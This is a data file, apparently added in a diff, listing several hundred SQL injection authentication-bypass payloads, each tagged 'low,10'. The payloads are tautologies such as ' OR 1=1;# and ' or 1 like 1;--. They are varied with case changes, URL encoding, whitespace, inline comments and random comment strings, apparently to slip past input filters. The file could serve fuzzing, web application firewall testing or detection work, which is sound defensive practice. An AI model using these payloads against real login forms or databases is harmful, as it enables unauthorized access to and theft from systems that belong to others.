+' OR 1=1;# # YZCWFF,low,10
+' or 1=1;# -- iHjuPh,low,10
+' or 1=1;# -- xzwIj,low,10
+'+or+1=1;# # HdjzMmzA,low,10
+' OR 1=1;# /* TEST */,low,10
+'/**/or/**/1=1;# # MySQL comment # MySQL comment,low,10
+' Or 1=1;#,low,10
+'+or+1=1;#+--+comment,low,10
+'/**/OR/**/1=1;#,low,10
+' Or 1=1;# /* tEST */ # MySQL comment,low,10
+' or 1=1;# # UMNxAtUE,low,10
+' or 1=1;# -- KbTYw,low,10
+'	or	1=1;#	--	comment,low,10
+"""	oR	1=1;#",low,10
+"""	or	1=1;#",low,10
+' or 1=1;# # hDryWA # tbVbmAI,low,10
+' or 1=1;# # MySQL comment -- yHQzFjLi,low,10
+'+or+1=1;# /* test */,low,10
+' or 1=1;# # sOAVb,low,10
+"""%20or%201=1;#",low,10
+' or 1=1;# -- RWLTIOqw -- comment,low,10
+' or 1=1;# # gkFmdNP,low,10
+' or 1=1;# # psIhSYSfVP # QEEQs,low,10
+""" or 1=1;# # MySQL comment -- YeJnZGWmBg",low,10
+' or 1=1;# -- zfTOKDjcNz,low,10
+'%20or%201=1;# -- comment,low,10
+' or 1=1;# # WUrVDTcy,low,10
+' OR 1=1;# # MKWFRHD,low,10
+'  or  1=1;#,low,10
+' OR 1=1;# /* TEST */ # XTOBNTDSR,low,10
+"""%20or%201=1;# /* test */",low,10
+'	or	1=1;#	--	COmMenT,low,10
+'%20or%201=1;# # MySQL comment,low,10
+""" or 1=1;# -- comment",low,10
+' or 1=1;# -- EtcggSCcx,low,10
+'/**/||/**/1=1;#,low,10
+'	OR	1=1;#,low,10
+' OR 1=1;# -- dmbbvG # mYsql COMMENT,low,10
+"""%20OR%201=1;# -- EycLkKBeKF",low,10
+' Or 1=1;# -- cOmMEnt /* test */,low,10
+'%20oR%201=1;# -- zPUbFZukV,low,10
+'%20||%201=1;#,low,10
+' OR 1=1;# # Rsvtupe,low,10
+'/**/oR/**/1=1;#/**/#/**/MySQL/**/comment,low,10
+'+or+1=1;# -- MPXPtsMH,low,10
+' OR 1=1;# # MySQL comment,low,10
+'	oR	1=1;#	/*	test	*/,low,10
+"""+or+1=1;# -- comment",low,10
+'	or	1=1;# # MySQL comment,low,10
+'+or+1=1;# # zwlddf,low,10
+"""+OR+1=1;#+#+MySQL+comment",low,10
+'	OR	1=1;#	--	comment,low,10
+'	or	1=1;# # MySQL comment # RqADEdBYC,low,10
+' or 1=1;# /* test */ # MySQL comment,low,10
+'/**/or/**/1=1;# -- ZwfvMjJ,low,10
+'%20oR%201=1;#%20#%20mYSQl%20commEnT,low,10
+'  OR  1=1;#  --  COMMEnt -- VfMYBmeZhA # voMArLd,low,10
+' oR 1=1;# # HLPCat,low,10
+'/**/or/**/1=1;# # MySQL comment # bQPhQtB,low,10
+'	OR	1=1;#	#	MYSQL	COMMENT,low,10
+'/**/or/**/1=1;#/**/#/**/rgkwz -- aoubm,low,10
+'		OR		1=1;#,low,10
+'%20OR%201=1;# -- COMMENT,low,10
+'/**/or/**/1=1;# -- comment # ORqXL,low,10
+' or 1=1;# # MySQL comment -- ewWCHMeM,low,10
+'/**/or/**/1=1;#/**/#/**/mysql/**/comment /* test */ -- comment,low,10
+'	or	1=1;# /* test */,low,10
+'%20or%201=1;#/**/--/**/comment/**/#/**/gpmDx,low,10
+'/**/or/**/1=1;# -- comment,low,10
+' or 1=1;# -- OwOPMa,low,10
+'%20or%201=1;# /* test */ -- jcoylqhLXb # NXBrCmrj,low,10
+' or 1=1;# -- CgyZtiwNeX,low,10
+' OR 1=1;# /* TEST */ # mYsql COMMENT,low,10
+'+OR+1=1;#+--+COMMENT+#+GOVTDY,low,10
+'+or+1=1;#  --  muKwkmHTF,low,10
+"""+OR+1=1;#",low,10
+""" or 1=1;# # mysQl coMmeNt",low,10
+' or 1=1;# /* test */ # UXoFT,low,10
+'	OR	1=1;#	#	MySQL	comment,low,10
+'		or		1=1;#	/*	test	*/,low,10
+"""+or+1=1;#+#+jRaKOieLJ",low,10
+' OR 1=1;# -- feOtl,low,10
+""" or 1=1;# # MySQL comment /* test */",low,10
+'	or	1=1;#	/*	test	*/,low,10
+' or 1=1;# # FbwyKDPtk,low,10
+' OR 1=1;# -- comment -- comment,low,10
+"""+or+1=1;#",low,10
+'+or+1=1;#+/*+test+*/,low,10
+' oR 1=1;# -- ComMENt,low,10
+' or 1=1;# -- eMywVNJyhR,low,10
+' or 1=1;# -- pyPzaJu,low,10
+""" or 1=1;# -- ABsarlvo -- comment -- comment",low,10
+'/**/or/**/1=1;#/**/#/**/mysql/**/comment,low,10
+'	OR	1=1;# # MYSQL COMMENT -- NuTvXVbvy,low,10
+' or 1=1;# -- bowBMDZRY,low,10
+'%20oR%201=1;#,low,10
+' oR 1=1;# -- comment # MySQL comment # yhaQi,low,10
+'/**/or/**/1=1;#%20#%20MySQL%20comment,low,10
+"""	or	1=1;#	--	GOUOL",low,10
+'/**/OR/**/1=1;#/**/--/**/ZZsHijxNhr,low,10
+' or 1=1;# -- JRvishrqrw,low,10
+""" OR 1=1;# -- comment",low,10
+'+or+1=1;#+/*+test+*/ # KlKzuRS,low,10
+' or 1=1;# # mysql comment,low,10
+' || 1=1;#,low,10
+'+or+1=1;#+#+MySQL+comment /* test */,low,10
+'+or+1=1;# # MySQL comment,low,10
+'	oR	1=1;#,low,10
+'%20OR%201=1;# # mYsql COMMENT /* TEST */,low,10
+'	or	1=1;#	#	nbYFm,low,10
+' or 1=1;# # mYSql CoMmeNT # mYsQl COmMEnt,low,10
+' OR 1=1;# -- EZfjn -- comment,low,10
+""" or 1=1;# /* test */ # PcNMpfWEfo",low,10
+' or 1=1;# # jbkqheao,low,10
+' OR 1=1;# -- SXyeM,low,10
+' or 1=1;# -- CIqYedTgKe -- comment,low,10
+'/**/oR/**/1=1;#,low,10
+'%20or%201=1;# -- eqmek,low,10
+'	or	1=1;# -- AShDh,low,10
+'	OR	1=1;#	#	FIzmH,low,10
+"""	or	1=1;#	--	GzMSXxv/**//*/**/test/**/*/",low,10
+' OR 1=1;# -- COMMENT,low,10
+'/**/or/**/1=1;#/**/--/**/gqCufs,low,10
+'	or	1=1;#	#	iqmyu,low,10
+"""+Or+1=1;#",low,10
+' or 1=1;# -- DDRBLt,low,10
+""" OR 1=1;# # WRANCDSII",low,10
+'+or+1=1;# # comment,low,10
+""" or 1=1;# # eEcdJKvXRL",low,10
+' OR 1=1;# # MYSQL COMMENT,low,10
+'%20or%201=1;#%20--%20comment,low,10
+'+or+1=1;#+#+MySQL+comment+/*+test+*/ # MySQL comment,low,10
+'+or+1=1;#+--+comment -- iwGOhsIyPh,low,10
+'%20or%201=1;#%20--%20pMaCxbzw%20--%20DnHBDBIf,low,10
+'	or	1=1;# # MfktVO,low,10
+' or 1=1;# -- comment -- jdppQr -- comment,low,10
+'+oR+1=1;#,low,10
+' OR 1=1;# # OEMHBWVOHK,low,10
+' OR 1=1;# # mYsql COMMENT /* test */,low,10
+'+OR+1=1;#+#+EEEUOXC,low,10
+' OR 1=1;# # TjtWbpmnb,low,10
+'+or+1=1;# # xvWTZ,low,10
+'/**/or/**/1=1;# # MySQL comment,low,10
+'%20or%201=1;# # BSvNBqqyz,low,10
+' oR 1=1;# # EQpAKn /* test */,low,10
+'%20or%201=1;# # MySQL comment /* test */,low,10
+'+OR+1=1;# # MySQL comment,low,10
+""" or 1=1;# -- COMMENT",low,10
+'/**/or/**/1=1;# # MJXShylnT,low,10
+"""	OR	1=1;# -- hZlpuSTwT",low,10
+'	or	1=1;#	--	EVVnh,low,10
+' OR 1=1;# # COMMENT # MySQL comment -- ORyXYaHw,low,10
+'%20OR%201=1;#%20--%20COMmeNt,low,10
+"""%20or%201=1;#%20/*%20test%20*/",low,10
+'/**/or/**/1=1;#/**/#/**/MySQL/**/comment,low,10
+'		or		1=1;#		#		comment,low,10
+"""/**/OR/**/1=1;#",low,10
+'+OR+1=1;# -- comment,low,10
+""" || 1=1;#",low,10
+' or 1=1;# -- jDrdAc -- dCZJTy,low,10
+'/**/Or/**/1=1;#,low,10
+' OR 1=1;# # EVnOe,low,10
+' OR 1=1;# -- jVmkPOGwIf,low,10
+'	or	1=1;# -- bnktzyj,low,10
+' or 1=1;# -- MXTqzKqp -- gIFlPHNd # OhOHzFFRU,low,10
+' OR 1=1;# /* test */ # LVaEKzCnAn,low,10
+'+or+1=1;# # PguKkAZd,low,10
+'%20or%201=1;#%20--%20gygSd%20--%20comment,low,10
+' or 1=1;# # EcZyad # WKjRGiJxLp,low,10
+""" or 1=1;# -- EylImVoV",low,10
+"""	or	1=1;# # jMIDOlZ",low,10
+"""	or	1=1;#%20/*%20test%20*/",low,10
+'%20or%201=1;#%20/*%20test%20*/ -- comment,low,10
+""" or 1=1;# # LuUExRb",low,10
+' or 1=1;# # MySQL comment # aaOLwIvYWu,low,10
+'%20OR%201=1;#%20--%20COMMENT,low,10
+'%20or%201=1;# -- comment /* test */,low,10
+""" or 1=1;# -- comment # MySQL comment -- PqZzxwGHP",low,10
+' or 1=1;# -- comment -- iNDZEQMSwX,low,10
+' OR 1=1;# # MySQL comment /* test */,low,10
+' or 1=1;# -- comment -- comment -- XqwkyaDfdX /* test */,low,10
+' or 1=1;# # zBstqdMHqz # wJUgq # MySQL comment,low,10
+' OR 1=1;# -- DXGQODZMVW /* TEST */ -- eQdrKHRTQU,low,10
+'%20or%201=1;#	/*	test	*/	--	MhfAtrwfKb,low,10
+'%20or%201=1;# # BtvcH,low,10
+'	or	1=1;#  #  MySQL  comment  /*  test  */,low,10
+""" or 1=1;# -- iZvZCHUMCG",low,10
+'/**/or/**/1=1;#%20#%20OPDGsb,low,10
+' OR 1=1;# # mYsql COMMENT,low,10
+' or 1=1;# -- comment -- dpjYuwxPK,low,10
+' oR 1=1;# -- plbNGFlb,low,10
+' or 1=1;# -- comment # iMjDSpZo -- comment # MySQL comment,low,10
+'%20or%201=1;#%20#%20comment,low,10
+' OR 1=1;# -- COMMENT -- AqjdY,low,10
+' or 1=1;# -- qiYxlvev,low,10
+'/**/or/**/1=1;#/**/#/**/MySQL/**/comment/**/#/**/JFxRHZ -- wkBsV,low,10
+'%20or%201=1;#%20#%20mysql%20comment # bxvxap /* test */,low,10
+""" or 1=1;# /* test */",low,10
+"""%20or%201=1;# -- comment",low,10
+' or 1 like 1;--,low,10
+'/**/or/**/1/**/like/**/1;#/**/--/**/comment,low,10
+' or 1 like 1;-- # OENhknRfZ,low,10
+' or 1 like 1;-- /* test */,low,10
+'+or+1+like+1;--,low,10
+' or 1 like 1;-- -- fvkUFJxqw,low,10
+' oR 1 LIKe 1;-- -- btFgN,low,10
+'	OR	1	LIKE	1;--,low,10
+' or 1 lIKE 1;--,low,10
+'%20or%201%20like%201;--,low,10
+'+or+1+like+1;#,low,10
+' OR 1 LIke 1;--,low,10
+""" or 1 like 1;--",low,10
+' OR 1 LIKE 1;--,low,10
+'/**/or/**/1/**/like/**/1;--,low,10
+'%20OR%201%20LIKE%201;--,low,10
+' Or 1 likE 1;--,low,10
+'/**/oR/**/1/**/likE/**/1;--,low,10
+'+OR+1+LIKE+1;--,low,10
+'	or	1	like	1;--,low,10
+'/**/OR/**/1/**/LIKE/**/1;--,low,10
+' OR 1 like 1;--,low,10
+' OR 1 LIKE 1;-- -- comment,low,10
+'/**/or/**/1/**/like/**/1;#,low,10
+' OR 1 LIKE 1;-- # gTRiIOMCQp,low,10
+' oR 1 lIke 1;--,low,10
+'	or	1	like	1;--	--	FzKfiLUb,low,10
+' or 1 like 1;-- -- comment,low,10
+' or 1 like 1;-- # MySQL comment,low,10
+'/**/or/**/1/**/like/**/1;-- # PbgyhoTvEH,low,10
+' or 1 like 1;-- -- TvWxFxwfjJ,low,10
+' or 1 like 1;#,low,10
+' or 1 like 1;-- -- HsLkny,low,10
+'	Or	1	LiKE	1;--,low,10
+' oR 1 LiKE 1;--,low,10
+' OR 1 LIKE 1;-- # BYeaYkinDJ,low,10
+' OR 1 LIKE 1;-- -- COMMENT,low,10
+'	or	1	like	1;-- # MySQL comment,low,10
+' Or 1 Like 1;--,low,10
+'	or	1	like	1;# # qDsAkoddH,low,10
+'/**/Or/**/1/**/Like/**/1;--,low,10
+'+or+1+like+1;-- # MySQL comment,low,10
+'+or+1+like+1;-- /* test */,low,10
+""" || 1 LIKE 1;--",low,10
+'  or  1  like  1;--,low,10
+'	||	1	LIKE	1;--,low,10
+'%20or%201%20like%201;-- # gDVSNtireN,low,10
+'/**/or/**/1/**/like/**/1;-- -- comment,low,10
+'%20or%201%20like%201;-- /* test */,low,10
+' or 1 like 1;-- -- HYYNPivJ,low,10
+' or 1 like 1;# -- TmqGWAkbeR,low,10
+' or 1 like 1;-- # UAlIUOvUfM,low,10
+' or 1 like 1;-- -- aeiQFXLz,low,10
+' or 1 like 1;-- -- YxiAEsVBOP # MySQL comment,low,10
+"""	or	1	like	1;--",low,10
+'%20or%201%20like%201;-- -- comment,low,10
+' oR 1 liKe 1;--,low,10
+'	or	1	like	1;--	#	MySQL	comment,low,10
+"""+or+1+like+1;--",low,10
+' or 1 like 1;-- -- NvshpELreH,low,10
+'%20or%201%20like%201;--%20/*%20test%20*/,low,10
+'%20or%201%20like%201;#,low,10
+'+OR+1+lIKE+1;--,low,10
+'/**/or/**/1/**/like/**/1;-- -- SYaHPzMIr -- comment,low,10
+' or 1 like 1;-- -- fgMPvuFhOj,low,10
+' or 1 like 1;-- # qeiah,low,10
+' or 1 lIKE 1;-- /* test */,low,10
+'+or+1+like+1;--+--+comment -- PHyjbEo,low,10
+'/**/or/**/1/**/like/**/1;--%20--%20comment,low,10
+""" OR 1 LIKE 1;--",low,10
+' or 1 like 1;-- -- mtVozSV,low,10
+' or 1 like 1;-- # QCKKIvBws,low,10
+'/**/OR/**/1/**/lIke/**/1;--,low,10
+' or 1 LiKe 1;-- # MySQl ComMenT,low,10
+'	or	1	like	1;#,low,10
+' or 1 LiKE 1;--,low,10
+' OR 1 LIKE 1;-- -- STQFGMJTT,low,10
+'%20or%201%20like%201;--%20#%20XODsChMa,low,10
+' or 1 like 1;# # yxfBtpBHS,low,10
+' or 1 like 1;-- /* test */ # MySQL comment,low,10
+' or 1 like 1;-- -- HJPNMG,low,10
+' OR 1 LIKE 1;-- # MYSQL COMMENT,low,10
+' or 1 like 1;-- -- ZmRlEE,low,10
+"""/**/or/**/1/**/like/**/1;--",low,10
+' or 1 like 1;-- -- JAyGWhfAmw,low,10
+' or 1 like 1;-- -- comment -- comment,low,10
+' or 1 like 1;-- /* test */ -- comment,low,10
+'  or  1  like  1;#,low,10
+"""+or+1+like+1;-- -- comment",low,10
+"""%20OR%201%20LIKE%201;--",low,10
+' Or 1 liKE 1;#,low,10
+'%20oR%201%20LikE%201;--,low,10
+'/**/or/**/1/**/like/**/1;-- # cLIlG,low,10
+' or 1 LIKe 1;-- -- commeNt,low,10
+"""	or	1	like	1;-- /* test */",low,10
+' or 1 like 1;-- /* test */ -- AICzBNCTJa,low,10
+' or 1 like 1;-- # OAhYDiiw,low,10
+' oR 1 like 1;-- # MySQL comment,low,10
+"""/**/or/**/1/**/like/**/1;-- -- comment",low,10
+' or 1 like 1;# # comment /* test */,low,10
+' OR 1 LIKE 1;-- # GMBEJL # ZGEMG,low,10
+'+or+1+like+1;--+/*+test+*/ /* test */,low,10
+' or 1 like 1;-- # okZkxzMn /* test */,low,10
+' OR 1 LIKE 1;-- -- DgggYeGuGP,low,10
+'%20or%201%20like%201;-- -- amSIOs -- comment # yxtDUbs,low,10
+'	or	1	like	1;--	/*	test	*/,low,10
+'%20or%201%20like%201;--%20#%20MySQL%20comment%20/*%20test%20*/,low,10
+' Or 1 lIke 1;-- # xUJwVAPH,low,10
+' oR 1 like 1;--,low,10
+"""	Or	1	lIkE	1;--",low,10
+""" OR 1 LIKE 1;# -- comment",low,10
+""" Or 1 lIkE 1;-- -- qunHsqkwG",low,10
+' or 1 like 1;# -- BJtfRVLBbl,low,10
+"""%20or%201%20like%201;-- -- comment",low,10
+' or 1 like 1;-- /* test */ /* test */,low,10
+' or 1 like 1;-- -- nzpyxopz,low,10
+'%20or%201%20like%201;-- # crcWxjtrx,low,10
+'%20OR%201%20LIKE%201;--	#	MySQL	comment,low,10
+'+or+1+like+1;--+#+PJbRlCVTjb -- PGSGhqja,low,10
+'+or+1+like+1;--+#+xrhcIs+/*+test+*/,low,10
+'/**/or/**/1/**/LIKe/**/1;--,low,10
+'/**/or/**/1/**/like/**/1;--+#+uvlOC,low,10
+'	or	1	like	1;--/**/#/**/MySQL/**/comment,low,10
+' or 1 LIkE 1;-- -- PtXZa,low,10
+' OR 1 LIKE 1;#,low,10
+' oR 1 LiKE 1;-- -- hQSyEka,low,10
+""" or 1 like 1;-- # MySQL comment",low,10
+'/**/or/**/1/**/like/**/1;--/**/--/**/jTtGPWum,low,10
+' or 1 like 1;-- -- OzyyVeZeLV -- CDhDTvaXr # MySQL comment,low,10
+""" or 1 like 1;# -- comment",low,10
+""" oR 1 LIKE 1;-- # fDepfPMGn",low,10
+'	or	1	like	1;--	--	comment	#	MySQL	comment,low,10
+'%20or%201%20like%201;#%20#%20ABLoPR,low,10
+'/**/OR/**/1/**/liKE/**/1;-- # SIDzZMK,low,10
+"""+or+1+like+1;--/**//*/**/test/**/*/",low,10
+'+or+1+like+1;--+/*+test+*/,low,10
+'/**/OR/**/1/**/LIKE/**/1;--/**/#/**/RFJPHXVNF,low,10
+'/**/or/**/1/**/like/**/1;-- # MySQL comment # UBzwNVFRB,low,10
+'+OR+1+LIkE+1;--,low,10
+'/**/OR/**/1/**/LIKE/**/1;--%20--%20CoMMENT,low,10
+'	OR	1	LIKE	1;-- -- comment,low,10
+'	OR	1	LIKE	1;--	#	mYsql	COMMENT,low,10
+'%20Or%201%20LIkE%201;-- # eVPbjmYDsm,low,10
+'	or	1	like	1;#	#	gkULN,low,10
+' OR 1 LIKE 1;-- -- COMMENT -- comment,low,10
+'%20or%201%20like%201;-- # MySQL comment /* test */,low,10
+'/**/or/**/1/**/like/**/1;-- -- comment -- UROYtChZ,low,10
+'%20or%201%20LiKE%201;--,low,10
+' or 1 like 1;-- -- FJTJtbIV,low,10
+' or 1 like 1;-- -- xAxFg # ygHFJuQkl,low,10
+"""+or+1+like+1;-- # hABZOdet",low,10
+' or 1 like 1;-- -- cwaFDLSrMl,low,10
+'+or+1+like+1;--+/*+test+*/ /* test */ -- comment,low,10
+' OR 1 LIKE 1;# # MySQL comment # MySQL comment,low,10
+'	OR	1	LIKE	1;--	/*	test	*/,low,10
+"""/**/OR/**/1/**/LIKE/**/1;--",low,10
+'/**/or/**/1/**/like/**/1;--/**/--/**/comment/**/#/**/MySQL/**/comment,low,10
+' or 1 like 1;-- -- AQkOOeCGF,low,10
+'/**/or/**/1/**/like/**/1;-- /* test */,low,10
+'	or	1	like	1;--%20/*%20test%20*/,low,10
+'	OR	1	liKe	1;--,low,10
+' Or 1 lIKe 1;--,low,10
+'	oR	1	lIKE	1;--,low,10
+""" or 1 like 1;# # KIYLskE",low,10
+' or 1 like 1;# # RZqWXj /* test */,low,10
+""" OR 1 lIke 1;--",low,10
+'%20OR%201%20LIKe%201;-- -- uemRDBbAyA,low,10
+' OR 1 LIKE 1;-- -- WWTPZZSJ,low,10
+""" or 1 like 1;-- # eHXChYk # MySQL comment",low,10
+' OR 1 LIKE 1;-- # BvoCNWfQU,low,10
+' or 1 like 1;-- -- buwke,low,10
+' or 1 like 1;-- -- dmkmeztstv,low,10
+' or 1 like 1;# # CrYErY # comment,low,10
+' OR 1 LIKE 1;-- -- CYRMNTG,low,10
+'/**/OR/**/1/**/LIKE/**/1;-- -- LChlxiLQx,low,10
+' OR 1 like 1;-- /* tEst */,low,10
+' or 1 like 1;-- # WpZJvCsXx -- RIdvfR /* test */,low,10
+'%20or%201%20like%201;--%20#%20zrTrtX,low,10
+'/**/or/**/1/**/like/**/1;-- -- JDQxbuzF,low,10
+"""/**/or/**/1/**/like/**/1;--/**/--/**/comment",low,10
+'/**/or/**/1/**/like/**/1;--/**//*/**/test/**/*/,low,10
+'%20OR%201%20LIKE%201;-- /* TEST */,low,10
+' or 1 like 1;-- -- pQTEr # MySQL comment # LEdiaYCS,low,10
+'/**/Or/**/1/**/LIKe/**/1;--,low,10
+'+oR+1+LIKE+1;--+--+apwhojDr,low,10
+"""/**/or/**/1/**/like/**/1;-- -- CtWhRrsni",low,10
+'/**/Or/**/1/**/liKE/**/1;--,low,10
+""" or 1 likE 1;-- # MySQL comment",low,10
+'%20OR%201%20LIKE%201;--/**//*/**/TEST/**/*/,low,10
+'/**/||/**/1/**/LIKE/**/1;--/**/--/**/COMMENT,low,10
+' Or 1 likE 1;# # Pupqd /* test */,low,10
+""" or 1 like 1;# /* test */",low,10
+'/**/OR/**/1/**/LIKE/**/1;# # SADXSTPQKX,low,10
+'%20or%201%20like%201;-- # gSClalXHC,low,10
+' or 1 like 1;-- # qfgizgifts,low,10
+""" or 1 like 1;-- # hHMKRFcLv -- xFmfQEQyNX",low,10
+' OR 1 LIKE 1;-- # JAZTPJ,low,10
+'/**/or/**/1/**/like/**/1;--	/*	test	*/,low,10
+'/**/or/**/1/**/like/**/1;-- # MySQL comment,low,10
+'%20OR%201%20LIKE%201;--%20/*%20test%20*/,low,10
+' or 1 like 1;-- # mysql comment,low,10
+'	OR	1	LIKE	1;#	#	MySQL	comment # WKTHyL,low,10
+'/**/OR/**/1/**/LIKE/**/1;#,low,10
+' or 1 like 1;-- -- comment # xdDqVzm,low,10
+'+or+1+like+1;--+/*+test+*/+#+yCyMXjy,low,10
+"""	or	1	like	1;#",low,10
+' || 1 LIKE 1;#,low,10
+' or 1 like 1;-- # thDVRvsSPc,low,10
+'/**/or/**/1/**/like/**/1;--/**/--/**/nQDkAgj,low,10
+' OR 1 LiKe 1;-- -- comment,low,10
+'/**/or/**/1/**/like/**/1;#/**/#/**/CVRjNjtT,low,10
+' or 1 like 1;-- -- comment -- mcwWdoDc,low,10
+'  or  1  like  1;--  --  nqhmjt,low,10
+'/**/or/**/1/**/like/**/1;--/**/--/**/PSkSM,low,10
+""" OR 1 lIke 1;-- -- gVrqAsGz",low,10
+' OR 1 lIkE 1;--,low,10
+""" OR 1 LIKE 1;-- -- nFAgYQa",low,10
+"""+or+1+Like+1;--",low,10
+'%20OR%201%20LIKE%201;-- # mLhNAN,low,10
+'%20||%201%20LIKE%201;--,low,10
+' or 1 like 1;-- -- tzbqzc,low,10
+""" OR 1 LIKE 1;#",low,10
+""" or 1 like 1;-- -- TNJypJSgjh",low,10
+' oR 1 LIKE 1;#,low,10
+"""+or+1+like+1;-- # JEIJkVZ # jgjggKU",low,10
+'	OR	1	Like	1;--,low,10
+'%20or%201%20like%201;--%20--%20xUiDtlVU%20--%20comment,low,10
+' or 1 like 1;-- /* test */ -- qWbeRo,low,10
+' or 1 like 1;# # KPQRQvFkC,low,10
+' or 1 like 1;# # PxYKiOz /* test */,low,10
+' OR 1 LIKE 1;-- -- HcwXSlqWwG # HvpJg,low,10
+'+or+1+like+1;# # comment # MySQL comment,low,10
+'/**/OR/**/1/**/LikE/**/1;--,low,10
+' OR 1 liKe 1;-- -- QSfQKV,low,10
+' or 1 like 1;-- -- asPnj,low,10
+' or 1 like 1;-- -- comment -- OPnAMb,low,10
+' OR 1 LiKE 1;-- -- comment /* test */,low,10
+' Or 1 lIKe 1;-- -- XpWqvnFYOV # wufALA,low,10
+'+oR+1+LiKe+1;--,low,10
+' or 1 like 1;# # MySQL comment -- jmkphVCtL,low,10
+"""+OR+1+LIKE+1;# -- comment",low,10
+'/**/OR/**/1/**/LIKE/**/1;--/**//*/**/TEST/**/*/,low,10
+'+or+1+like+1;--+--+comment,low,10
+'/**/or/**/1/**/like/**/1;#/**/#/**/comment,low,10
+'+or+1+like+1;--+#+Occsdg,low,10
+' or 1 like 1;# /* test */ # BCyVXmWQYN,low,10
+""" or 1 like 1;-- # mUfdGQQf",low,10
+'/**/or/**/1/**/like/**/1;--/**/#/**/MySQL/**/comment/**/#/**/MySQL/**/comment,low,10
+'	OR	1	LIKE	1;--	#	MJOQEN	#	MYSQL	COMMENT # gTqplNc,low,10
+'+or+1+like+1;-- # kCihYjvE,low,10
+""" OR 1=1 --",low,10
+"""	OR	1=1	--",low,10
+""" || 1=1 --",low,10
+"""  OR  1=1  --",low,10
+"""/**/OR/**/1=1/**/--",low,10
+""" OR 1=1 -- # MySQL comment",low,10
+"""%20OR%201=1%20--",low,10
+""" oR 1=1 -- # BwoAd",low,10
+""" OR 1=1 -- -- NcEhApaXej -- UJEFnvC",low,10
+"""+OR+1=1+-- -- exYsmrZPzm",low,10
+"""	or	1=1	--",low,10
+""" oR 1=1 --",low,10
+"""+OR+1=1+--+--+comment",low,10
+"""+OR+1=1+#",low,10
+""" OR 1=1 -- -- comment",low,10
+""" OR 1=1 -- # DosNMhrlcq",low,10
+""" OR 1=1 -- /* test */",low,10
+""" or 1=1 --",low,10
+""" OR 1=1 -- -- pPytJcrTJB",low,10
+"""%20or%201=1%20--",low,10
+"""+OR+1=1+--",low,10
+""" OR 1=1 -- -- PKlTZEy",low,10
+""" OR 1=1 #",low,10
+""" OR 1=1 # -- comment /* test */",low,10
+""" OR 1=1 -- # hSktLeObc",low,10
+""" || 1=1 -- # EBMrsEXs",low,10
+""" OR 1=1 # # comment",low,10
+"""+||+1=1+--",low,10
+""" or 1=1 -- # mysql comment",low,10
+"""%20OR%201=1%20-- # MySQL comment",low,10
+""" or 1=1 -- -- COMMENT",low,10
+""" OR 1=1 -- -- pMrmYpJcK",low,10
+""" OR 1=1 -- # GBjuq",low,10
+""" OR 1=1 -- # zgDDCA",low,10
+""" OR 1=1 -- # fTebRhh # MySQL comment",low,10
+""" || 1=1 -- -- ueSXBEXkyj",low,10
+""" Or 1=1 -- /* test */ /* test */",low,10
+""" || 1=1 -- # cczYE",low,10
+""" or 1=1 -- # AnEmYSIhqN",low,10
+"""%20OR%201=1%20-- -- comment",low,10
+""" OR 1=1 # # zTAeOW",low,10
+""" OR 1=1 -- -- pYaMFtH",low,10
+""" Or 1=1 --",low,10
+""" OR 1=1 -- # wbycc # MySQL comment",low,10
+"""%20OR%201=1%20#",low,10
+""" OR 1=1 -- -- cOMment # MySQL comment",low,10
+""" OR 1=1 -- -- PxgtkSOdY",low,10
+""" OR 1=1 -- # zaFCla",low,10
+""" OR 1=1 -- -- hsmrHKZO",low,10
+"""%20%20or%20%201=1%20%20--",low,10
+""" or 1=1 #",low,10
+"""+OR+1=1+--+#+cPvrtLzfkC+#+AEzXGPYvbt",low,10
+""" OR 1=1 -- # MySQL comment -- wnpobczz",low,10
+""" or 1=1 -- /* test */ -- WWHMHyv",low,10
+"""+OR+1=1+--+#+vlvgqfhR",low,10
+""" OR 1=1 -- -- jqJBYIHK",low,10
+"""+||+1=1+--+#+MySQL+comment",low,10
+""" OR 1=1 -- /* TEST */",low,10
+"""/**/OR/**/1=1/**/-- /* test */",low,10
+""" OR 1=1 -- -- gbiYy",low,10
+""" OR 1=1 -- # VzPmOqjNP",low,10
+"""/**/OR/**/1=1/**/--/**//*/**/test/**/*/",low,10
+""" oR 1=1 # /* test */",low,10
+""" or 1=1 -- # LepckJJU",low,10
+""" OR 1=1 -- # ZXweO -- EojlcOfWw",low,10
+"""+OR+1=1+-- -- wDRRASebg",low,10
+""" Or 1=1 #",low,10
+"""	OR	1=1	--	#	MySQL	comment",low,10
+"""+OR+1=1+--+/*+test+*/",low,10
+""" OR 1=1 -- # GmNcO",low,10
+""" OR 1=1 -- # NamDZCSTW",low,10
+"""/**/or/**/1=1/**/--",low,10
+""" || 1=1 -- -- SeMHqxYPmc",low,10
+""" OR 1=1 -- # MySQL comment -- VislpfPAJ",low,10
+""" OR 1=1 -- # EuHqlZFFu",low,10
+""" OR 1=1 # -- yeRyN",low,10
+""" or 1=1 -- -- comment",low,10
+"""%20OR%201=1%20--%20--%20comment",low,10
+""" or 1=1 # # wfsczxcv",low,10
+""" Or 1=1 -- -- dRFEdCoI",low,10
+""" OR 1=1 -- -- WncjmuzVT",low,10
+""" oR 1=1 -- /* test */",low,10
+""" OR 1=1 -- # MysQl cOMmEnt",low,10
+""" OR 1=1 -- -- TxVhNd",low,10
+"""/**/OR/**/1=1/**/-- # EoqPjzBp",low,10
+""" OR 1=1 -- -- BBeXxbnN",low,10
+""" OR 1=1 -- -- UPzyQUPmFp # MySQL comment",low,10
+""" OR 1=1 -- -- zUFvKZv",low,10
+"""%20OR%201=1%20--%20#%20MySQL%20comment%20--%20comment",low,10
+""" OR 1=1 -- -- VIiApDz",low,10
+""" OR 1=1 -- -- COMMENT",low,10
+""" or 1=1 -- # xxLBxT",low,10
+""" || 1=1 -- -- COMMENT",low,10
+"""+OR+1=1+#+#+QbxiN",low,10
+"""+OR+1=1+--+#+MYSQL+COMMENT",low,10
+"""  or  1=1  --  #  mysql  comment",low,10
+""" || 1=1 -- # jfasXwR",low,10
+"""	||	1=1	--	#	DGpFAhBAbf /* test */",low,10
+"""/**/OR/**/1=1/**/--/**/#/**/KAGsux/**/--/**/comment/**/#/**/nipnO",low,10
+""" OR 1=1 # # MySQL comment",low,10
+"""	OR	1=1	--	--	lSEZhwKJ",low,10
+"""%20or%201=1%20--%20--%20comment",low,10
+"""	OR	1=1	--/**//*/**/TEST/**/*/",low,10
+""" or 1=1 -- # skwxdgb",low,10
+"""%20||%201=1%20--%20--%20OQiir",low,10
+"""+OR+1=1+--+#+EcXkdo",low,10
+"""	OR	1=1	#",low,10
+"""+OR+1=1+# # vfhcMSom",low,10
+"""	OR	1=1	--	--	comment",low,10
+"""+oR+1=1+--+#+ybeCl",low,10
